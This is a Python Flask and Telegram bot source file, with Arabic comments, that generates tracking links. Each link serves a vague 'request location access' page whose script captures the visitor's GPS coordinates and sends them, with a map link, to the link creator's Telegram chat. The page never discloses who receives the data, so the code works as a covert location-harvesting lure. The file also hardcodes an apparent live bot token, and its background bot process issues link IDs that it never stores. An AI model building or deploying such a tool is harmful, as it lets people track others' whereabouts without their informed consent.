"""
بوت تتبع المواقع - Telegram Location Tracking Bot
نسخة multiprocessing تعمل على Render
البوت: @cccc00bot
"""

from flask import Flask, request, jsonify
import telebot
import multiprocessing
import logging
import os
import secrets
import time
import sys
from datetime import datetime, timedelta

# ========== إعدادات Logging ==========
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout)  # تأكد من ظهور السجلات في Render
    ]
)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# ========== إعدادات البوت ==========
BOT_TOKEN = os.environ.get('BOT_TOKEN', '7628474532:AAHQMH9nJHYqB25X89kQYtE8Ms3x5e6m7TY')
bot = telebot.TeleBot(BOT_TOKEN, parse_mode='Markdown')

# ========== تخزين البيانات ==========
tracking_links = {}
user_data = {}

# ========== صفحات الويب ==========
@app.route('/')
def home():
    return '''
    <!DOCTYPE html>
    <html dir="rtl">
    <head><meta charset="UTF-8"><title>📍 بوت التتبع</title></head>
    <body style="text-align:center;padding:50px;background:#667eea;color:white;">
        <h1>📍 بوت تتبع المواقع</h1>
        <p>✅ الخدمة تعمل</p>
        <p>🤖 البوت: @cccc00bot</p>
        <a href="/health" style="color:#4CAF50;">فحص الصحة</a>
    </body>
    </html>
    '''

@app.route('/health')
def health():
    return jsonify({
        'status': 'healthy',
        'bot': '@cccc00bot',
        'timestamp': datetime.now().isoformat(),
        'active_links': len(tracking_links)
    })

@app.route('/bot_status')
def bot_status():
    """فحص حالة البوت"""
    try:
        bot_info = bot.get_me()
        return jsonify({
            'bot_running': True,
            'bot_username': bot_info.username,
            'bot_name': bot_info.first_name,
            'connected': True
        })
    except:
        return jsonify({'bot_running': False})

# ========== معالجات البوت ==========
@bot.message_handler(commands=['start', 'help'])
def handle_start(message):
    """معالجة أمر /start"""
    try:
        user_id = message.from_user.id
        username = message.from_user.username or "بدون"
        first_name = message.from_user.first_name or "مستخدم"
        
        logger.info(f"📩 استقبل /start من: {username} ({first_name})")
        
        # حفظ بيانات المستخدم
        user_data[user_id] = {
            'name': first_name,
            'username': username,
            'first_seen': datetime.now(),
            'last_active': datetime.now()
        }
        
        response = f"""
🎯 **مرحباً {first_name}!**

📍 **بوت تتبع المواقع الآمن**
🤖 **البوت:** @cccc00bot
🆔 **معرفك:** `{user_id}`

🚀 **للبدء:** أرسل `/newlink`
📋 **المساعدة:** أرسل `/help`
        """
        
        bot.reply_to(message, response)
        logger.info(f"✅ تم الرد على {username}")
        
    except Exception as e:
        logger.error(f"❌ خطأ في /start: {e}")

@bot.message_handler(commands=['newlink'])
def handle_newlink(message):
    """إنشاء رابط تتبع جديد"""
    try:
        user_id = message.from_user.id
        chat_id = message.chat.id
        
        # إنشاء معرف فريد
        tracking_id = secrets.token_urlsafe(12)
        
        # حفظ الرابط
        tracking_links[tracking_id] = {
            'chat_id': chat_id,
            'user_id': user_id,
            'created_at': datetime.now(),
            'expires_at': datetime.now() + timedelta(hours=24),
            'active': True
        }
        
        # إنشاء الرابط
        tracking_url = f'https://telegram-tracking-bot-nkgz.onrender.com/track/{tracking_id}'
        
        response = f"""
✅ **تم إنشاء رابط تتبع جديد!**

🔗 **الرابط:**
{tracking_url}

🆔 **الكود:** `{tracking_id}`
⏰ **الصلاحية:** 24 ساعة

📱 **افتح الرابط على جهاز آخر للإرسال**
        """
        
        bot.reply_to(message, response)
        logger.info(f"📝 تم إنشاء رابط: {tracking_id}")
        
    except Exception as e:
        logger.error(f"❌ خطأ في newlink: {e}")

@bot.message_handler(commands=['ping'])
def handle_ping(message):
    """اختبار البوت"""
    bot.reply_to(message, "🏓 *Pong!* البوت يعمل ✅")

# ========== صفحة التتبع ==========
@app.route('/track/<tracking_id>')
def track_page(tracking_id):
    if tracking_id in tracking_links:
        return '''
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <title>طلب الموقع</title>
            <style>
                body { font-family: Arial; text-align: center; padding: 50px; }
                .btn { background: #28a745; color: white; padding: 15px 30px; 
                       border: none; border-radius: 5px; font-size: 18px; cursor: pointer; }
            </style>
        </head>
        <body>
            <h1>📍 طلب الوصول إلى الموقع</h1>
            <button class="btn" onclick="getLocation()">✅ موافق ومتابعة</button>
            <script>
                function getLocation() {
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(
                            function(position) {
                                const data = {
                                    latitude: position.coords.latitude,
                                    longitude: position.coords.longitude,
                                    accuracy: position.coords.accuracy,
                                    timestamp: new Date().toISOString(),
                                    tracking_id: "''' + tracking_id + '''"
                                };
                                
                                fetch('/track', {
                                    method: 'POST',
                                    headers: {'Content-Type': 'application/json'},
                                    body: JSON.stringify(data)
                                }).then(() => {
                                    document.body.innerHTML = "<h1>✅ تم الإرسال بنجاح</h1>";
                                });
                            },
                            function(error) {
                                alert("فشل: " + error.message);
                            }
                        );
                    } else {
                        alert("المتصفح لا يدعم الموقع");
                    }
                }
            </script>
        </body>
        </html>
        '''
    return "رابط غير صالح", 404

@app.route('/track', methods=['POST'])
def handle_track():
    try:
        data = request.get_json()
        tracking_id = data.get('tracking_id')
        
        if tracking_id in tracking_links:
            chat_id = tracking_links[tracking_id]['chat_id']
            lat = data.get('latitude')
            lon = data.get('longitude')
            
            bot.send_message(
                chat_id,
                f'''📍 *موقع جديد!*

🆔 **الكود:** `{tracking_id}`
📍 **الإحداثيات:** `{lat}`, `{lon}`
🗺️ **الخريطة:** https://maps.google.com/?q={lat},{lon}
🕒 **الوقت:** {datetime.now().strftime("%Y/%m/%d %I:%M %p")}
                '''
            )
            
            return jsonify({'success': True})
            
        return jsonify({'error': 'رابط غير صالح'}), 400
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ========== تشغيل البوت ==========
def run_bot_process():
    """تشغيل البوت في عملية منفصلة"""
    # إنشاء logger منفصل للعملية
    bot_logger = logging.getLogger('bot_process')
    bot_logger.setLevel(logging.INFO)
    
    bot_logger.info("🚀 بدء عملية البوت...")
    
    # إنشاء كائن bot جديد للعملية
    bot_process = telebot.TeleBot(BOT_TOKEN, parse_mode='Markdown')
    
    # تعريف معالجات الرسائل داخل العملية
    @bot_process.message_handler(commands=['start', 'help'])
    def bot_start(message):
        bot_process.reply_to(message, "✅ *البوت يعمل!* أرسل `/newlink`")
    
    @bot_process.message_handler(commands=['newlink'])
    def bot_newlink(message):
        tracking_id = secrets.token_urlsafe(12)
        bot_process.reply_to(message, f"🔗 *رابط جديد:* `{tracking_id}`")
    
    @bot_process.message_handler(commands=['ping'])
    def bot_ping(message):
        bot_process.reply_to(message, "🏓 *Pong!*")
    
    # محاولة الاتصال
    try:
        bot_info = bot_process.get_me()
        bot_logger.info(f"✅ البوت متصل: @{bot_info.username}")
        
        # بدء Polling
        bot_logger.info("🎯 بدء استقبال الرسائل...")
        bot_process.polling(none_stop=True, timeout=30, long_polling_timeout=30)
        
    except Exception as e:
        bot_logger.error(f"❌ خطأ في البوت: {e}")
        bot_logger.info("🔄 إعادة المحاولة بعد 5 ثواني...")
        time.sleep(5)
        # إعادة تشغيل العملية
        run_bot_process()

# ========== بدء التشغيل ==========
if __name__ == '__main__':
    logger.info("=" * 50)
    logger.info("🚀 بدء تشغيل نظام التتبع...")
    logger.info(f"🤖 البوت: @cccc00bot")
    logger.info("=" * 50)
    
    # بدء عملية البوت في الخلفية
    try:
        bot_process = multiprocessing.Process(target=run_bot_process, daemon=True)
        bot_process.start()
        logger.info("✅ بدأت عملية البوت في الخلفية")
    except Exception as e:
        logger.error(f"❌ فشل بدء عملية البوت: {e}")
    
    # تشغيل خادم Flask
    port = int(os.environ.get('PORT', 10000))
    logger.info(f"🌐 بدء خادم Flask على المنفذ {port}")
    logger.info("=" * 50)
    logger.info("✅ النظام جاهز!")
    logger.info("=" * 50)
    
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)